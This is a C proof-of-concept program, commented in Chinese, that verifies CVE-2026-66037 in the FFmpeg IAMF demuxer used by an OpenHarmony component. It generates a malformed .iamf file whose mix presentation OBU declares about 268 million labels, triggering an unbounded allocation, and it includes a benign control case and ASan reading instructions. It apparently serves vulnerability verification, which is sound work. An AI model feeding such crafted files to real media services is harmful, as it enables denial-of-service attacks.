/*
 * CVE-2026-66037 运行验证 PoC — third_party/ffmpeg IAMF count_label 无界分配
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavformat/iamf_parse.c 与
 * 上游 n7.1.1 逐字节一致（case.json oh_source.equivalence），本 PoC 在该
 * 基线构建（上游 n7.1.1 同码）上执行，结论直接代表 OH 组件。上游修复
 * 86708357d126 为 count_label 增加对剩余输入字节的校验。
 *
 * 触发原理：iamf_parse.c:862-865，mix_presentation OBU 的 count_label 由
 * ffio_read_leb 直接读入并 av_calloc(count_label, 8)，无
 * "count_label > 剩余输入字节数" 约束——攻击者以 8 字节流声明 2^56 量级
 * 标签数，触发无界分配（oss-fuzz 口径：unbounded allocation DoS）。
 *
 * PoC 在运行时自生成畸形 .iamf（IA Sequence Header OBU + Mix Presentation
 * OBU），无需外部样本：
 *   OBU1: type=31(0xF8) size=6 payload='iamf'+profile 两字节
 *   OBU2: type=2 (0x10) payload= mix_presentation_id(leb=1) + count_label(leb)
 *         trigger: count_label = 0x0FFFFFFF（声明 2.68 亿标签、剩余输入 0 字节，
 *                  申请 ~2GB，位于 av_malloc 内部 INT_MAX 上限之下、可被
 *                  ASan max_allocation_size_mb 上限定点拦截）
 *         control: count_label = 1 + 'en' 标签
 *
 * 判读：
 *   trigger + ASAN_OPTIONS=max_allocation_size_mb=1024
 *     -> "requested allocation size 2147483640 exceeds ..." 硬报告，栈帧指向
 *        iamf_parse.c:865（av_calloc(count_label) 行）——无界分配被定点观测
 *        （声明量仅受 8 字节 leb128 上限约束，与剩余输入无关即缺陷本体）；
 *   无 ASan 时 trigger 在内存上限（ulimit -v / 容器限额）下表现为瞬时
 *        OOM/ENOMEM；
 *   control 的 Mix Presentation OBU 解析通过（随后因描述符-only 文件缺
 *   音频帧 OBU 以 EOF 收场，属预期），证明差异仅来自 count_label 畸形值。
 *
 * 用法：./poc_iamf trigger|control <输出.iamf>
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libavformat/avformat.h"

static void put_leb128(FILE *f, uint64_t v)
{
    do {
        uint8_t b = v & 0x7f;
        v >>= 7;
        if (v) b |= 0x80;
        fputc(b, f);
    } while (v);
}

static void obu_header(FILE *f, unsigned type, uint64_t payload_size)
{
    fputc((int)((type << 3) & 0xff), f); /* redundant=0 trimming=0 ext=0 */
    put_leb128(f, payload_size);
}

int main(int argc, char **argv)
{
    if (argc != 3 || (strcmp(argv[1], "trigger") && strcmp(argv[1], "control"))) {
        fprintf(stderr, "usage: %s trigger|control <out.iamf>\n", argv[0]);
        return 2;
    }
    int control = !strcmp(argv[1], "control");

    FILE *f = fopen(argv[2], "wb");
    if (!f) { perror("fopen"); return 3; }

    /* IA Sequence Header OBU: payload = 'iamf' + primary/ additional profile */
    obu_header(f, 31, 6);
    fwrite("iamf", 1, 4, f);
    fputc(0x00, f);
    fputc(0x00, f);

    /* Mix Presentation OBU */
    if (control) {
        unsigned char body[16];
        size_t n = 0;
        body[n++] = 0x01;                 /* mix_presentation_id = 1 */
        body[n++] = 0x01;                 /* count_label = 1 */
        body[n++] = (unsigned char)'e';   /* language label "en" */
        body[n++] = (unsigned char)'n';
        body[n++] = 0x00;                 /* string 以 0 终止（label_string 口径）*/
        body[n++] = 0x01;                 /* annotation "x" */
        body[n++] = (unsigned char)'x';
        body[n++] = 0x00;
        body[n++] = 0x00;                 /* nb_submixes = 0 */
        obu_header(f, 2, n);
        fwrite(body, 1, n, f);
    } else {
        /* mix_presentation_id(1) + count_label leb128(4 字节编码 0x0FFFFFFF) + 尾部截断 */
        obu_header(f, 2, 5);
        fputc(0x01, f);
        put_leb128(f, 0x0FFFFFFFULL); /* FF FF FF 0F —— 2.68 亿标签，剩余输入 0 字节 */
    }
    fclose(f);
    printf("case=iamf_%s file=%s written\n", argv[1], argv[2]);

    /* 用 avformat 打开（iamf demuxer 的 header 阶段解析 Mix Presentation OBU） */
    const AVInputFormat *fmt = NULL;
    avformat_network_init();
    fmt = av_find_input_format("iamf");
    if (!fmt) { fprintf(stderr, "iamf demuxer not built\n"); return 4; }
    AVFormatContext *ctx = NULL;
    int ret = avformat_open_input(&ctx, argv[2], fmt, NULL);
    if (ret < 0) {
        printf("case=iamf_%s open_input_ret=%d (parse stopped)\n", argv[1], ret);
        return 0;
    }
    printf("case=iamf_%s open_input=OK streams=%d\n", argv[1], ctx->nb_streams);
    avformat_close_input(&ctx);
    return 0;
}
